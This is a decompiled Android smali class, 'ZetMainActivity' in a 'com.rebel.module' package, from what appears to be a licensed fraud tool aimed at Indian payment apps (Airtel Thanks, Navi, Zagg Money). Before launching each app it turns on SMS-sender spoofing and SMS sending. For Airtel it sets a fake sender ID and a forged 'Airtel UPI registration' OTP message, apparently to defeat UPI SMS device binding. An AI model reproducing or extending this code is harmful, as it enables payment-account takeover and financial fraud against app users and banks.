.class public Lcom/rebel/module/ZetMainActivity;
.super Landroidx/appcompat/app/AppCompatActivity;
.source "ZetMainActivity.java"


# static fields
.field private static final AIRTEL_PKG:Ljava/lang/String; = "com.myairtelapp"

.field private static final NAVI_PKG:Ljava/lang/String; = "com.naviapp"

.field private static final ZAGG_PKG:Ljava/lang/String; = "omnicash.rio.app"


# instance fields
.field private appPager:Landroidx/viewpager2/widget/ViewPager2;

.field private configManager:Lcom/rebel/module/ConfigManager;

.field private dotEsaf:Landroid/view/View;

.field private dotNavi:Landroid/view/View;

.field private dotZagg:Landroid/view/View;

.field private pageLabel:Landroid/widget/TextView;


# direct methods
.method static bridge synthetic -$$Nest$mupdateDots(Lcom/rebel/module/ZetMainActivity;I)V
    .locals 0

    invoke-direct {p0, p1}, Lcom/rebel/module/ZetMainActivity;->updateDots(I)V

    return-void
.end method

.method static constructor <clinit>()V
    .locals 1

    .line 30
    const-string v0, "rebelcore"

    invoke-static {v0}, Ljava/lang/System;->loadLibrary(Ljava/lang/String;)V

    .line 31
    return-void
.end method

.method public constructor <init>()V
    .locals 0

    .line 17
    invoke-direct {p0}, Landroidx/appcompat/app/AppCompatActivity;-><init>()V

    return-void
.end method

.method private launchApp(Ljava/lang/String;)V
    .locals 5
    .param p1, "pkg"    # Ljava/lang/String;

    .line 173
    const/4 v0, 0x0

    :try_start_0
    invoke-virtual {p0}, Lcom/rebel/module/ZetMainActivity;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v1

    .line 174
    .local v1, "pm":Landroid/content/pm/PackageManager;
    invoke-virtual {v1, p1}, Landroid/content/pm/PackageManager;->getLaunchIntentForPackage(Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v2

    .line 175
    .local v2, "launch":Landroid/content/Intent;
    if-nez v2, :cond_0

    .line 176
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v3, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, " not installed"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {p0, v3, v0}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object v3

    invoke-virtual {v3}, Landroid/widget/Toast;->show()V

    .line 177
    return-void

    .line 179
    :cond_0
    const/high16 v3, 0x14000000

    invoke-virtual {v2, v3}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 180
    invoke-virtual {p0, v2}, Lcom/rebel/module/ZetMainActivity;->startActivity(Landroid/content/Intent;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 183
    .end local v1    # "pm":Landroid/content/pm/PackageManager;
    .end local v2    # "launch":Landroid/content/Intent;
    goto :goto_0

    .line 181
    :catch_0
    move-exception v1

    .line 182
    .local v1, "e":Ljava/lang/Exception;
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "Launch failed: "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {p0, v2, v0}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object v0

    invoke-virtual {v0}, Landroid/widget/Toast;->show()V

    .line 184
    .end local v1    # "e":Ljava/lang/Exception;
    :goto_0
    return-void
.end method

.method private updateDots(I)V
    .locals 2
    .param p1, "position"    # I

    .line 80
    if-nez p1, :cond_0

    .line 81
    iget-object v0, p0, Lcom/rebel/module/ZetMainActivity;->pageLabel:Landroid/widget/TextView;

    const-string v1, "AIRTEL THANKS"

    invoke-virtual {v0, v1}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    .line 82
    iget-object v0, p0, Lcom/rebel/module/ZetMainActivity;->dotEsaf:Landroid/view/View;

    sget v1, Lcom/rebel/module/R$drawable;->dot_active:I

    invoke-virtual {v0, v1}, Landroid/view/View;->setBackgroundResource(I)V

    .line 83
    iget-object v0, p0, Lcom/rebel/module/ZetMainActivity;->dotNavi:Landroid/view/View;

    sget v1, Lcom/rebel/module/R$drawable;->dot_inactive:I

    invoke-virtual {v0, v1}, Landroid/view/View;->setBackgroundResource(I)V

    .line 84
    iget-object v0, p0, Lcom/rebel/module/ZetMainActivity;->dotZagg:Landroid/view/View;

    sget v1, Lcom/rebel/module/R$drawable;->dot_inactive:I

    invoke-virtual {v0, v1}, Landroid/view/View;->setBackgroundResource(I)V

    goto :goto_0

    .line 85
    :cond_0
    nop

    .line 91
    iget-object v0, p0, Lcom/rebel/module/ZetMainActivity;->pageLabel:Landroid/widget/TextView;

    .line 85
    const/4 v1, 0x1

    if-ne p1, v1, :cond_1

    .line 86
    const-string v1, "NAVI"

    invoke-virtual {v0, v1}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    .line 87
    iget-object v0, p0, Lcom/rebel/module/ZetMainActivity;->dotEsaf:Landroid/view/View;

    sget v1, Lcom/rebel/module/R$drawable;->dot_inactive:I

    invoke-virtual {v0, v1}, Landroid/view/View;->setBackgroundResource(I)V

    .line 88
    iget-object v0, p0, Lcom/rebel/module/ZetMainActivity;->dotNavi:Landroid/view/View;

    sget v1, Lcom/rebel/module/R$drawable;->dot_active:I

    invoke-virtual {v0, v1}, Landroid/view/View;->setBackgroundResource(I)V

    .line 89
    iget-object v0, p0, Lcom/rebel/module/ZetMainActivity;->dotZagg:Landroid/view/View;

    sget v1, Lcom/rebel/module/R$drawable;->dot_inactive:I

    invoke-virtual {v0, v1}, Landroid/view/View;->setBackgroundResource(I)V

    goto :goto_0

    .line 91
    :cond_1
    const-string v1, "ZAGG MONEY"

    invoke-virtual {v0, v1}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    .line 92
    iget-object v0, p0, Lcom/rebel/module/ZetMainActivity;->dotEsaf:Landroid/view/View;

    sget v1, Lcom/rebel/module/R$drawable;->dot_inactive:I

    invoke-virtual {v0, v1}, Landroid/view/View;->setBackgroundResource(I)V

    .line 93
    iget-object v0, p0, Lcom/rebel/module/ZetMainActivity;->dotNavi:Landroid/view/View;

    sget v1, Lcom/rebel/module/R$drawable;->dot_inactive:I

    invoke-virtual {v0, v1}, Landroid/view/View;->setBackgroundResource(I)V

    .line 94
    iget-object v0, p0, Lcom/rebel/module/ZetMainActivity;->dotZagg:Landroid/view/View;

    sget v1, Lcom/rebel/module/R$drawable;->dot_active:I

    invoke-virtual {v0, v1}, Landroid/view/View;->setBackgroundResource(I)V

    .line 96
    :goto_0
    return-void
.end method


# virtual methods
.method protected onCreate(Landroid/os/Bundle;)V
    .locals 3
    .param p1, "savedInstanceState"    # Landroid/os/Bundle;

    .line 37
    invoke-super {p0, p1}, Landroidx/appcompat/app/AppCompatActivity;->onCreate(Landroid/os/Bundle;)V

    .line 40
    invoke-virtual {p0}, Lcom/rebel/module/ZetMainActivity;->getWindow()Landroid/view/Window;

    move-result-object v0

    const/16 v1, 0x400

    invoke-virtual {v0, v1, v1}, Landroid/view/Window;->setFlags(II)V

    .line 43
    invoke-virtual {p0}, Lcom/rebel/module/ZetMainActivity;->getWindow()Landroid/view/Window;

    move-result-object v0

    invoke-virtual {v0}, Landroid/view/Window;->getDecorView()Landroid/view/View;

    move-result-object v0

    const/16 v1, 0x1706

    invoke-virtual {v0, v1}, Landroid/view/View;->setSystemUiVisibility(I)V

    .line 51
    sget v0, Lcom/rebel/module/R$layout;->activity_zet_main:I

    invoke-virtual {p0, v0}, Lcom/rebel/module/ZetMainActivity;->setContentView(I)V

    .line 55
    :try_start_0
    new-instance v0, Lcom/rebel/module/ConfigManager;

    invoke-direct {v0}, Lcom/rebel/module/ConfigManager;-><init>()V

    iput-object v0, p0, Lcom/rebel/module/ZetMainActivity;->configManager:Lcom/rebel/module/ConfigManager;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    .line 56
    :catch_0
    move-exception v0

    :goto_0
    nop

    .line 59
    sget v0, Lcom/rebel/module/R$id;->appPager:I

    invoke-virtual {p0, v0}, Lcom/rebel/module/ZetMainActivity;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroidx/viewpager2/widget/ViewPager2;

    iput-object v0, p0, Lcom/rebel/module/ZetMainActivity;->appPager:Landroidx/viewpager2/widget/ViewPager2;

    .line 60
    sget v0, Lcom/rebel/module/R$id;->tv_page_label:I

    invoke-virtual {p0, v0}, Lcom/rebel/module/ZetMainActivity;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/TextView;

    iput-object v0, p0, Lcom/rebel/module/ZetMainActivity;->pageLabel:Landroid/widget/TextView;

    .line 61
    sget v0, Lcom/rebel/module/R$id;->dot_esaf:I

    invoke-virtual {p0, v0}, Lcom/rebel/module/ZetMainActivity;->findViewById(I)Landroid/view/View;

    move-result-object v0

    iput-object v0, p0, Lcom/rebel/module/ZetMainActivity;->dotEsaf:Landroid/view/View;

    .line 62
    sget v0, Lcom/rebel/module/R$id;->dot_navi:I

    invoke-virtual {p0, v0}, Lcom/rebel/module/ZetMainActivity;->findViewById(I)Landroid/view/View;

    move-result-object v0

    iput-object v0, p0, Lcom/rebel/module/ZetMainActivity;->dotNavi:Landroid/view/View;

    .line 63
    sget v0, Lcom/rebel/module/R$id;->dot_zagg:I

    invoke-virtual {p0, v0}, Lcom/rebel/module/ZetMainActivity;->findViewById(I)Landroid/view/View;

    move-result-object v0

    iput-object v0, p0, Lcom/rebel/module/ZetMainActivity;->dotZagg:Landroid/view/View;

    .line 66
    new-instance v0, Lcom/rebel/module/ZetPagerAdapter;

    invoke-direct {v0, p0}, Lcom/rebel/module/ZetPagerAdapter;-><init>(Landroidx/fragment/app/FragmentActivity;)V

    .line 67
    .local v0, "adapter":Lcom/rebel/module/ZetPagerAdapter;
    iget-object v1, p0, Lcom/rebel/module/ZetMainActivity;->appPager:Landroidx/viewpager2/widget/ViewPager2;

    invoke-virtual {v1, v0}, Landroidx/viewpager2/widget/ViewPager2;->setAdapter(Landroidx/recyclerview/widget/RecyclerView$Adapter;)V

    .line 70
    const/4 v1, 0x0

    invoke-direct {p0, v1}, Lcom/rebel/module/ZetMainActivity;->updateDots(I)V

    .line 71
    iget-object v1, p0, Lcom/rebel/module/ZetMainActivity;->appPager:Landroidx/viewpager2/widget/ViewPager2;

    new-instance v2, Lcom/rebel/module/ZetMainActivity$1;

    invoke-direct {v2, p0}, Lcom/rebel/module/ZetMainActivity$1;-><init>(Lcom/rebel/module/ZetMainActivity;)V

    invoke-virtual {v1, v2}, Landroidx/viewpager2/widget/ViewPager2;->registerOnPageChangeCallback(Landroidx/viewpager2/widget/ViewPager2$OnPageChangeCallback;)V

    .line 77
    return-void
.end method

.method public onDataManagementClick(Landroid/view/View;)V
    .locals 3
    .param p1, "v"    # Landroid/view/View;

    .line 109
    :try_start_0
    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcom/rebel/module/ZetDataManagementActivity;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 110
    .local v0, "intent":Landroid/content/Intent;
    invoke-virtual {p0, v0}, Lcom/rebel/module/ZetMainActivity;->startActivity(Landroid/content/Intent;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 113
    .end local v0    # "intent":Landroid/content/Intent;
    goto :goto_0

    .line 111
    :catch_0
    move-exception v0

    .line 112
    .local v0, "e":Ljava/lang/Exception;
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "Backups unavailable: "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    const/4 v2, 0x0

    invoke-static {p0, v1, v2}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object v1

    invoke-virtual {v1}, Landroid/widget/Toast;->show()V

    .line 114
    .end local v0    # "e":Ljava/lang/Exception;
    :goto_0
    return-void
.end method

.method public onLaunchEsafClick(Landroid/view/View;)V
    .locals 2
    .param p1, "v"    # Landroid/view/View;

    .line 119
    iget-object v0, p0, Lcom/rebel/module/ZetMainActivity;->configManager:Lcom/rebel/module/ConfigManager;

    if-eqz v0, :cond_0

    .line 120
    iget-object v0, p0, Lcom/rebel/module/ZetMainActivity;->configManager:Lcom/rebel/module/ConfigManager;

    const/4 v1, 0x1

    invoke-virtual {v0, v1}, Lcom/rebel/module/ConfigManager;->setFixAirtelEnabled(Z)V

    .line 121
    iget-object v0, p0, Lcom/rebel/module/ZetMainActivity;->configManager:Lcom/rebel/module/ConfigManager;

    invoke-virtual {v0, v1}, Lcom/rebel/module/ConfigManager;->setSpoofSenderEnabled(Z)V

    .line 122
    iget-object v0, p0, Lcom/rebel/module/ZetMainActivity;->configManager:Lcom/rebel/module/ConfigManager;

    invoke-virtual {v0, v1}, Lcom/rebel/module/ConfigManager;->setSmsSenderEnabled(Z)V

    .line 123
    iget-object v0, p0, Lcom/rebel/module/ZetMainActivity;->configManager:Lcom/rebel/module/ConfigManager;

    const-string v1, "airtel"

    invoke-virtual {v0, v1}, Lcom/rebel/module/ConfigManager;->setSpoofPreset(Ljava/lang/String;)V

    .line 124
    iget-object v0, p0, Lcom/rebel/module/ZetMainActivity;->configManager:Lcom/rebel/module/ConfigManager;

    const-string v1, "AD-AIRBNK-S"

    invoke-virtual {v0, v1}, Lcom/rebel/module/ConfigManager;->setSenderId(Ljava/lang/String;)V

    .line 125
    iget-object v0, p0, Lcom/rebel/module/ZetMainActivity;->configManager:Lcom/rebel/module/ConfigManager;

    const-string v1, "<#> {otp} OTP for Airtel UPI registration. Please do not share the OTP with anyone. If not requested call 1800-23400. N9BWuqauU1y"

    invoke-virtual {v0, v1}, Lcom/rebel/module/ConfigManager;->setSpoofBody(Ljava/lang/String;)V

    .line 128
    :cond_0
    const-string v0, "\ud83d\ude80 Airtel launched \u2014 UPI SMS fix active"

    const/4 v1, 0x0

    invoke-static {p0, v0, v1}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object v0

    invoke-virtual {v0}, Landroid/widget/Toast;->show()V

    .line 129
    const-string v0, "com.myairtelapp"

    invoke-direct {p0, v0}, Lcom/rebel/module/ZetMainActivity;->launchApp(Ljava/lang/String;)V

    .line 130
    return-void
.end method

.method public onLaunchNaviClick(Landroid/view/View;)V
    .locals 3
    .param p1, "v"    # Landroid/view/View;

    .line 135
    iget-object v0, p0, Lcom/rebel/module/ZetMainActivity;->configManager:Lcom/rebel/module/ConfigManager;

    const/4 v1, 0x1

    if-eqz v0, :cond_0

    .line 136
    iget-object v0, p0, Lcom/rebel/module/ZetMainActivity;->configManager:Lcom/rebel/module/ConfigManager;

    const-string v2, "navi"

    invoke-virtual {v0, v2}, Lcom/rebel/module/ConfigManager;->setSpoofPreset(Ljava/lang/String;)V

    .line 137
    iget-object v0, p0, Lcom/rebel/module/ZetMainActivity;->configManager:Lcom/rebel/module/ConfigManager;

    invoke-virtual {v0, v1}, Lcom/rebel/module/ConfigManager;->setSpoofSenderEnabled(Z)V

    .line 138
    iget-object v0, p0, Lcom/rebel/module/ZetMainActivity;->configManager:Lcom/rebel/module/ConfigManager;

    invoke-virtual {v0, v1}, Lcom/rebel/module/ConfigManager;->setSmsSenderEnabled(Z)V

    .line 141
    :cond_0
    invoke-virtual {p0}, Lcom/rebel/module/ZetMainActivity;->prepareEsafLaunch()Z

    move-result v0

    if-eqz v0, :cond_1

    .line 142
    const-string v0, "\ud83d\ude80 Navi launched \u2014 NAVI template active"

    const/4 v1, 0x0

    invoke-static {p0, v0, v1}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object v0

    invoke-virtual {v0}, Landroid/widget/Toast;->show()V

    .line 143
    const-string v0, "com.naviapp"

    invoke-direct {p0, v0}, Lcom/rebel/module/ZetMainActivity;->launchApp(Ljava/lang/String;)V

    goto :goto_0

    .line 145
    :cond_1
    const-string v0, "Can\'t launch: App Expired or Invalid License"

    invoke-static {p0, v0, v1}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object v0

    invoke-virtual {v0}, Landroid/widget/Toast;->show()V

    .line 147
    :goto_0
    return-void
.end method

.method public onLaunchZaggClick(Landroid/view/View;)V
    .locals 5
    .param p1, "v"    # Landroid/view/View;

    .line 152
    iget-object v0, p0, Lcom/rebel/module/ZetMainActivity;->configManager:Lcom/rebel/module/ConfigManager;

    const/4 v1, 0x1

    if-eqz v0, :cond_0

    .line 153
    iget-object v0, p0, Lcom/rebel/module/ZetMainActivity;->configManager:Lcom/rebel/module/ConfigManager;

    const-string v2, "zagg"

    invoke-virtual {v0, v2}, Lcom/rebel/module/ConfigManager;->setSpoofPreset(Ljava/lang/String;)V

    .line 154
    iget-object v0, p0, Lcom/rebel/module/ZetMainActivity;->configManager:Lcom/rebel/module/ConfigManager;

    invoke-virtual {v0, v1}, Lcom/rebel/module/ConfigManager;->setSpoofSenderEnabled(Z)V

    .line 155
    iget-object v0, p0, Lcom/rebel/module/ZetMainActivity;->configManager:Lcom/rebel/module/ConfigManager;

    invoke-virtual {v0, v1}, Lcom/rebel/module/ConfigManager;->setSmsSenderEnabled(Z)V

    .line 159
    :cond_0
    const-string v0, "SrcPrefs"

    const/4 v2, 0x0

    invoke-virtual {p0, v0, v2}, Lcom/rebel/module/ZetMainActivity;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v0

    const-string v3, "license_key"

    const-string v4, ""

    invoke-interface {v0, v3, v4}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 160
    .local v0, "savedKey":Ljava/lang/String;
    invoke-virtual {p0}, Lcom/rebel/module/ZetMainActivity;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v3

    const-string v4, "android_id"

    invoke-static {v3, v4}, Landroid/provider/Settings$Secure;->getString(Landroid/content/ContentResolver;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    .line 163
    .local v3, "aid":Ljava/lang/String;
    if-eqz v3, :cond_1

    move-object v4, v3

    goto :goto_0

    :cond_1
    const-string v4, "unknown"

    :goto_0
    invoke-static {v0, v4}, Lcom/rebel/module/NativeBridge;->nativeZaggValidateKey(Ljava/lang/String;Ljava/lang/String;)Z

    move-result v4

    if-eqz v4, :cond_2

    .line 164
    const-string v1, "\ud83d\ude80 Zagg validated and launched"

    invoke-static {p0, v1, v2}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object v1

    invoke-virtual {v1}, Landroid/widget/Toast;->show()V

    .line 165
    const-string v1, "omnicash.rio.app"

    invoke-direct {p0, v1}, Lcom/rebel/module/ZetMainActivity;->launchApp(Ljava/lang/String;)V

    goto :goto_1

    .line 167
    :cond_2
    const-string v2, "Can\'t launch Zagg: Server Validation Failed or Invalid Key"

    invoke-static {p0, v2, v1}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object v1

    invoke-virtual {v1}, Landroid/widget/Toast;->show()V

    .line 169
    :goto_1
    return-void
.end method

.method public onSettingsClick(Landroid/view/View;)V
    .locals 3
    .param p1, "v"    # Landroid/view/View;

    .line 100
    :try_start_0
    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcom/rebel/module/ZetSettingsActivity;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 101
    .local v0, "intent":Landroid/content/Intent;
    invoke-virtual {p0, v0}, Lcom/rebel/module/ZetMainActivity;->startActivity(Landroid/content/Intent;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 104
    .end local v0    # "intent":Landroid/content/Intent;
    goto :goto_0

    .line 102
    :catch_0
    move-exception v0

    .line 103
    .local v0, "e":Ljava/lang/Exception;
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "Settings unavailable: "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    const/4 v2, 0x0

    invoke-static {p0, v1, v2}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object v1

    invoke-virtual {v1}, Landroid/widget/Toast;->show()V

    .line 105
    .end local v0    # "e":Ljava/lang/Exception;
    :goto_0
    return-void
.end method

.method public native prepareEsafLaunch()Z
.end method
